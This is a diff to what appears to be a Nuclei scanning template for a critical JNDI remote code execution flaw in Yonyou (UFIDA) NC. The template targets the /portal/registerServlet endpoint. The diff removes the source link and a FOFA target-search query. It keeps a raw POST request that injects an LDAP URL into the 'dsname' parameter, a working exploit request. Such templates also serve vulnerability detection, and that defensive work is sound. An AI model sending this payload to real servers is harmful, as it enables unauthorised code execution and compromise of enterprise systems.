@@ -3,12 +3,8 @@ info:
   name: 用友NC-JNDI远程代码执行-registerServlet
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wne48iz7gpxggx54'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wne48iz7gpxggx54
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'POST /portal/registerServlet HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     type=1&dsname=ldap://www.baidu.com
